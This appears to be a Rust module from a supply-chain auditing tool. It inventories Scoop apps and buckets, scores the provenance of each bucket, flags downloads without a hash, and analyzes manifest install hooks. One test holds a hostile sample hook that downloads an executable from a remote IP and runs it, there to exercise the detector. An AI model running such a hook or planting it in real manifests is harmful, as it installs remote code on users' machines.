//! Scoop backend — user-scope installs, Git buckets, per-manifest hashes.
//!
//! Scoop's risk is not the binary, it is the **bucket**: a manifest is a JSON
//! recipe pointing at someone's download, and adding a bucket is adding a Git
//! repository you now trust to describe what gets run.
//!
//! Two shapes on disk that a naive reading gets wrong, both measured:
//!
//! - `main` is **not a Git repository**. Modern Scoop ships it as a plain
//!   extracted directory, so `scoop export` reports its source as a local path
//!   while `extras` reports a GitHub URL. Treating "no remote" as unverifiable
//!   would flag the official bucket on every machine.
//! - Manifest fields are polymorphic: `bin` is a string for one package and an
//!   array for the next, and `hash` is bare `sha256` here and prefixed
//!   `sha512:` there.

use super::*;

/// Buckets published by the Scoop project itself.
const OFFICIAL_BUCKET_HOST: &str = "github.com/scoopinstaller/";

/// The bucket Scoop ships with, which has no Git remote to check.
const BUILTIN_BUCKET: &str = "main";

/// One bucket, resolved to the Git remote actually configured for it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Bucket {
    pub name: String,
    /// Empty when the bucket is not a Git checkout.
    pub remote: String,
}

/// One installed app, read from its own directory under `<root>\apps`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct ScoopApp {
    pub name: String,
    pub version: String,
    /// The bucket it came from, per its `install.json`.
    pub bucket: String,
}

// --- parsing ------------------------------------------------------------------

/// The bucket recorded in an app's `install.json`.
pub(crate) fn bucket_from_install_json(text: &str) -> String {
    serde_json::from_str::<serde_json::Value>(text)
        .ok()
        .and_then(|v| v.get("bucket").and_then(|b| b.as_str()).map(String::from))
        .unwrap_or_default()
}

/// The version a manifest declares.
pub(crate) fn version_from_manifest(text: &str) -> String {
    serde_json::from_str::<serde_json::Value>(text)
        .ok()
        .and_then(|v| v.get("version").and_then(|x| x.as_str()).map(String::from))
        .unwrap_or_default()
}

/// The `url = ...` of the `[remote "origin"]` section of a Git config.
///
/// Read from the file rather than by spawning `git` per bucket: it is the same
/// answer, without N processes, and it works when Git is not on PATH.
pub(crate) fn remote_from_git_config(config: &str) -> String {
    let mut in_origin = false;
    for line in config.lines() {
        let t = line.trim();
        if t.starts_with('[') {
            in_origin = t.replace(' ', "").eq_ignore_ascii_case("[remote\"origin\"]");
            continue;
        }
        if in_origin
            && let Some(rest) = t.strip_prefix("url")
            && let Some((_, url)) = rest.split_once('=')
        {
            return url.trim().to_string();
        }
    }
    String::new()
}

/// The provenance verdict for a bucket.
pub(crate) fn bucket_signal(b: &Bucket) -> Option<SysSignal> {
    // `main` ships with Scoop and is not a checkout — it has no remote to
    // verify, and demanding one would flag every installation.
    if b.name.eq_ignore_ascii_case(BUILTIN_BUCKET) && b.remote.is_empty() {
        return None;
    }
    let remote = b.remote.to_ascii_lowercase();
    if remote.is_empty() {
        return Some(SysSignal::new(
            format!("bucket '{}' has no Git remote — its origin cannot be checked", b.name),
            Category::ThirdPartySource,
            Severity::Medium,
            20,
        ));
    }
    // Match on host+org, so `github.com/someone/scoopinstaller-fake` cannot
    // pass by having the string somewhere in its path.
    let normalized = remote
        .trim_start_matches("https://")
        .trim_start_matches("http://")
        .trim_start_matches("git@")
        .replace("github.com:", "github.com/");
    if normalized.starts_with(OFFICIAL_BUCKET_HOST) {
        // An official-but-not-main bucket is a wider surface than `main`: less
        // traffic, same trust granted.
        return Some(SysSignal::new(
            format!("bucket '{}' (official, outside main)", b.name),
            Category::ThirdPartySource,
            Severity::Low,
            10,
        ));
    }
    Some(SysSignal::new(
        format!("bucket '{}' is third-party Git ({})", b.name, b.remote),
        Category::ThirdPartySource,
        Severity::High,
        40,
    ))
}

/// Does this manifest pin a hash for everything it downloads?
///
/// Handles both manifest shapes: a top-level `url`/`hash` pair, and a
/// per-architecture table. A `url` with no `hash` beside it is the finding.
pub(crate) fn download_is_unpinned(manifest: &serde_json::Value) -> bool {
    fn unpinned(o: &serde_json::Value) -> bool {
        o.get("url").is_some() && o.get("hash").is_none()
    }
    if unpinned(manifest) {
        return true;
    }
    manifest
        .get("architecture")
        .and_then(|a| a.as_object())
        .is_some_and(|arches| arches.values().any(unpinned))
}

/// The install hooks a manifest declares, concatenated as PowerShell.
///
/// `pre_install`/`post_install` are a string or an array of lines, and
/// `installer.script` is the same. All of it runs at install time.
pub(crate) fn manifest_hooks(manifest: &serde_json::Value) -> String {
    fn lines(v: Option<&serde_json::Value>) -> String {
        match v {
            Some(serde_json::Value::String(s)) => s.clone(),
            Some(serde_json::Value::Array(a)) => a
                .iter()
                .filter_map(|x| x.as_str())
                .collect::<Vec<_>>()
                .join("\n"),
            _ => String::new(),
        }
    }
    let mut out = String::new();
    for part in [
        lines(manifest.get("pre_install")),
        lines(manifest.get("post_install")),
        lines(manifest.get("installer").and_then(|i| i.get("script"))),
        lines(manifest.get("uninstaller").and_then(|i| i.get("script"))),
    ] {
        if !part.is_empty() {
            out.push_str(&part);
            out.push('\n');
        }
    }
    out
}

// --- inventory ----------------------------------------------------------------

/// Scoop's user root, honouring the `SCOOP` override.
fn scoop_root() -> std::path::PathBuf {
    if let Ok(p) = std::env::var("SCOOP") {
        return std::path::PathBuf::from(p);
    }
    let home = std::env::var("USERPROFILE").unwrap_or_default();
    std::path::Path::new(&home).join("scoop")
}

/// Every configured bucket, with the remote read off its checkout.
pub(crate) fn buckets(root: &std::path::Path) -> Vec<Bucket> {
    let Ok(entries) = std::fs::read_dir(root.join("buckets")) else {
        return Vec::new();
    };
    let mut out = Vec::new();
    for e in entries.filter_map(std::result::Result::ok) {
        if !e.path().is_dir() {
            continue;
        }
        let remote = std::fs::read_to_string(e.path().join(".git").join("config"))
            .map(|c| remote_from_git_config(&c))
            .unwrap_or_default();
        out.push(Bucket {
            name: e.file_name().to_string_lossy().into_owned(),
            remote,
        });
    }
    out
}

/// The single version directory beside `current`, when there is exactly one.
/// Ambiguous when several versions are kept, so nothing is guessed then.
pub(crate) fn version_dir(app_dir: &std::path::Path) -> Option<String> {
    let mut versions: Vec<String> = std::fs::read_dir(app_dir)
        .ok()?
        .filter_map(std::result::Result::ok)
        .filter(|e| e.path().is_dir())
        .map(|e| e.file_name().to_string_lossy().into_owned())
        .filter(|n| !n.eq_ignore_ascii_case("current"))
        .collect();
    if versions.len() == 1 {
        versions.pop()
    } else {
        None
    }
}

pub fn scoop_inventory(opts: Opts) -> Result<Inventory> {
    let _ = opts;
    let root = scoop_root();
    let apps = installed_apps(&root);
    if apps.is_empty() && !root.join("apps").is_dir() {
        anyhow::bail!(
            "no Scoop installation found at {} — refusing to report an empty inventory as \
             a clean one",
            root.display()
        );
    }

    let buckets = buckets(&root);
    let repos: Vec<Repo> = buckets
        .iter()
        .map(|b| Repo {
            name: b.name.clone(),
            url: b.remote.clone(),
            official: bucket_signal(b).is_none_or(|s| s.severity <= Severity::Low),
        })
        .collect();

    let mut signals: HashMap<String, Vec<SysSignal>> = HashMap::new();
    let mut deps = Vec::with_capacity(apps.len());
    for app in &apps {
        // A package inherits its bucket's provenance: that is where the recipe
        // describing it came from.
        if let Some(b) = buckets.iter().find(|b| b.name == app.bucket)
            && let Some(sig) = bucket_signal(b)
        {
            push_signal(&mut signals, &app.name, sig);
        }

        let manifest_path = root
            .join("apps")
            .join(&app.name)
            .join("current")
            .join("manifest.json");
        if let Ok(text) = std::fs::read_to_string(&manifest_path)
            && let Ok(manifest) = serde_json::from_str::<serde_json::Value>(&text)
        {
            if download_is_unpinned(&manifest) {
                push_signal(
                    &mut signals,
                    &app.name,
                    SysSignal::new(
                        "download-without-hash",
                        Category::Unsigned,
                        Severity::Critical,
                        50,
                    ),
                );
            }
            let hooks = manifest_hooks(&manifest);
            if !hooks.trim().is_empty() {
                push_signal(
                    &mut signals,
                    &app.name,
                    SysSignal::new(
                        "install-script (runs code at install)",
                        Category::InstallHook,
                        Severity::Info,
                        0,
                    ),
                );
                for sig in super::recipe::analyze_recipe(&app.name, &hooks, "ps1") {
                    push_signal(&mut signals, &app.name, sig);
                }
            }
        }

        deps.push(Dependency {
            name: app.name.clone(),
            version: app.version.clone(),
            ecosystem: Ecosystem::Scoop,
            direct: true,
            scope: Scope::Prod,
            licenses: Vec::new(),
            license_source: LicenseSource::Unknown,
            resolved_url: None,
            integrity: None,
            parents: Vec::new(),
        });
    }

    let mut notes = Vec::new();
    // Scoop's installer asks users to lower the execution policy. `RemoteSigned`
    // is what it actually needs; `Unrestricted`/`Bypass` is a machine-wide
    // loosening that outlives the install.
    if let Ok(raw) = powershell("(Get-ExecutionPolicy -Scope CurrentUser).ToString()") {
        let policy = raw.trim();
        if matches!(policy, "Unrestricted" | "Bypass") {
            notes.push(format!(
                "PowerShell execution policy for this user is {policy} [High] — any script \
                 runs unprompted, not just Scoop's"
            ));
        }
    }

    let summary = format!("{} app(s) from {} bucket(s)", deps.len(), buckets.len());
    Ok(Inventory {
        manager: "scoop",
        deps,
        repos,
        signals,
        claims: Vec::new(),
        summary,
        notes,
    })
}

/// Every installed app, read from `<root>\apps`.
///
/// Read off disk rather than through `scoop export`: Scoop's entry point is a
/// `.ps1` with a `.cmd` shim, and Windows' `CreateProcess` resolves only
/// `.exe`, so spawning `scoop` fails outright. The filesystem is also the more
/// robust source — it does not depend on PATH, on the execution policy, or on
/// Scoop's shims being intact.
pub(crate) fn installed_apps(root: &std::path::Path) -> Vec<ScoopApp> {
    let Ok(entries) = std::fs::read_dir(root.join("apps")) else {
        return Vec::new();
    };
    let mut out = Vec::new();
    for e in entries.filter_map(std::result::Result::ok) {
        let current = e.path().join("current");
        if !current.is_dir() {
            continue;
        }
        let name = e.file_name().to_string_lossy().into_owned();
        let bucket = std::fs::read_to_string(current.join("install.json"))
            .map(|t| bucket_from_install_json(&t))
            .unwrap_or_default();
        let version = std::fs::read_to_string(current.join("manifest.json"))
            .map(|t| version_from_manifest(&t))
            .unwrap_or_default();
        // Scoop installs itself as an app and ships no manifest for it, which
        // would leave an empty version — and `name@version` is the dedup key
        // everything downstream uses. Fall back to the version directory the
        // `current` junction points at.
        let version = if version.is_empty() {
            version_dir(&e.path()).unwrap_or_else(|| "unknown".to_string())
        } else {
            version
        };
        out.push(ScoopApp { name, version, bucket });
    }
    out
}


#[cfg(test)]
mod tests {
    use super::*;

    /// Verbatim `.git/config` of the installed `extras` bucket, tabs included.
    const GIT_CONFIG: &str = "[core]\n\trepositoryformatversion = 0\n\tfilemode = false\n[remote \"origin\"]\n\turl = https://github.com/ScoopInstaller/Extras\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n";

    /// Verbatim `install.json` files: Scoop records the originating bucket
    /// beside each installed app, which is where provenance comes from.
    #[test]
    fn the_bucket_is_read_from_the_apps_own_install_json() {
        assert_eq!(
            bucket_from_install_json("{\n    \"bucket\": \"extras\",\n    \"architecture\": \"64bit\"\n}"),
            "extras"
        );
        assert_eq!(
            bucket_from_install_json("{\n    \"bucket\": \"main\",\n    \"architecture\": \"64bit\"\n}"),
            "main"
        );
        // A missing or unreadable file must not invent a bucket.
        assert_eq!(bucket_from_install_json("{}"), "");
        assert_eq!(bucket_from_install_json("not json"), "");
    }

    #[test]
    fn the_version_is_read_from_the_manifest() {
        assert_eq!(version_from_manifest(r#"{"version":"0.85"}"#), "0.85");
        assert_eq!(version_from_manifest(r#"{"description":"x"}"#), "");
    }

    #[test]
    fn the_remote_is_read_from_the_origin_section_only() {
        assert_eq!(
            remote_from_git_config(GIT_CONFIG),
            "https://github.com/ScoopInstaller/Extras"
        );
        // A url under another remote must not be mistaken for origin's.
        let other = "[remote \"upstream\"]\n\turl = https://evil.test/x\n";
        assert_eq!(remote_from_git_config(other), "");
        assert_eq!(remote_from_git_config(""), "");
    }

    /// The calibration: `main` ships with Scoop as a plain extracted directory,
    /// not a Git checkout. Demanding a remote would flag the official bucket on
    /// every single machine.
    #[test]
    fn the_builtin_main_bucket_needs_no_remote() {
        let main = Bucket { name: "main".into(), remote: String::new() };
        assert!(bucket_signal(&main).is_none());
    }

    /// Any *other* bucket without a remote is genuinely unverifiable.
    #[test]
    fn another_bucket_without_a_remote_is_unverifiable() {
        let b = Bucket { name: "local".into(), remote: String::new() };
        let s = bucket_signal(&b).expect("should flag");
        assert_eq!(s.severity, Severity::Medium);
    }

    #[test]
    fn an_official_bucket_outside_main_is_a_wider_surface_not_an_alarm() {
        let b = Bucket {
            name: "extras".into(),
            remote: "https://github.com/ScoopInstaller/Extras".into(),
        };
        let s = bucket_signal(&b).expect("should be noted");
        assert_eq!(s.severity, Severity::Low);
    }

    /// Matched on host+organisation, so a repository merely *named* after the
    /// project cannot launder itself into looking official.
    #[test]
    fn a_lookalike_bucket_repository_does_not_pass() {
        for remote in [
            "https://github.com/someone/scoopinstaller-extras",
            "https://gitlab.test/ScoopInstaller/Extras",
            "https://github.com.evil.test/ScoopInstaller/Extras",
        ] {
            let b = Bucket { name: "x".into(), remote: remote.into() };
            let s = bucket_signal(&b).expect("should flag");
            assert_eq!(s.severity, Severity::High, "{remote} slipped through");
        }
    }

    /// SSH remotes reach the same repositories.
    #[test]
    fn an_ssh_remote_is_normalised_before_comparison() {
        let b = Bucket {
            name: "extras".into(),
            remote: "git@github.com:ScoopInstaller/Extras.git".into(),
        };
        assert_eq!(bucket_signal(&b).unwrap().severity, Severity::Low);
    }

    /// Real manifests: jq pins a bare sha256 per architecture, putty a
    /// prefixed sha512. Both are pinned.
    #[test]
    fn a_manifest_that_pins_every_download_is_not_flagged() {
        let jq: serde_json::Value = serde_json::from_str(
            r#"{"version":"1.8.2","architecture":{
                "64bit":{"url":"https://x.test/jq.exe","hash":"a6fc67fe"},
                "32bit":{"url":"https://x.test/jq32.exe","hash":"a99cb668"}}}"#,
        )
        .unwrap();
        assert!(!download_is_unpinned(&jq));

        let putty: serde_json::Value = serde_json::from_str(
            r#"{"architecture":{"64bit":{"url":"https://x.test/p.zip","hash":"sha512:af4bc4fb"}}}"#,
        )
        .unwrap();
        assert!(!download_is_unpinned(&putty));
    }

    /// One architecture missing its hash is enough: that is the one that gets
    /// installed on the matching machine.
    #[test]
    fn a_single_unpinned_architecture_is_the_finding() {
        let m: serde_json::Value = serde_json::from_str(
            r#"{"architecture":{
                "64bit":{"url":"https://x.test/a.exe","hash":"deadbeef"},
                "32bit":{"url":"https://x.test/b.exe"}}}"#,
        )
        .unwrap();
        assert!(download_is_unpinned(&m));

        let top: serde_json::Value =
            serde_json::from_str(r#"{"url":"https://x.test/a.exe"}"#).unwrap();
        assert!(download_is_unpinned(&top));
    }

    /// Hooks are a string in one manifest and an array of lines in the next.
    #[test]
    fn hooks_are_collected_whatever_shape_they_take() {
        let m: serde_json::Value = serde_json::from_str(
            r#"{"pre_install":"Write-Output one",
                "post_install":["Write-Output two","Write-Output three"],
                "installer":{"script":"Write-Output four"}}"#,
        )
        .unwrap();
        let hooks = manifest_hooks(&m);
        for needle in ["one", "two", "three", "four"] {
            assert!(hooks.contains(needle), "missing {needle} in {hooks:?}");
        }
        // A manifest with no hooks yields nothing to analyze.
        let plain: serde_json::Value = serde_json::from_str(r#"{"version":"1"}"#).unwrap();
        assert!(manifest_hooks(&plain).is_empty());
    }

    /// A hook is PowerShell, so it goes through the same analyzers as a choco
    /// script — the reason `Lang::PowerShell` exists.
    #[test]
    fn a_hostile_hook_is_analysed_as_powershell() {
        let m: serde_json::Value = serde_json::from_str(
            r#"{"post_install":["iwr http://198.51.100.7/x -OutFile p.exe","Start-Process p.exe"]}"#,
        )
        .unwrap();
        let sigs = super::super::recipe::analyze_recipe("evil", &manifest_hooks(&m), "ps1");
        assert!(!sigs.is_empty(), "a hostile scoop hook must produce findings");
    }
}
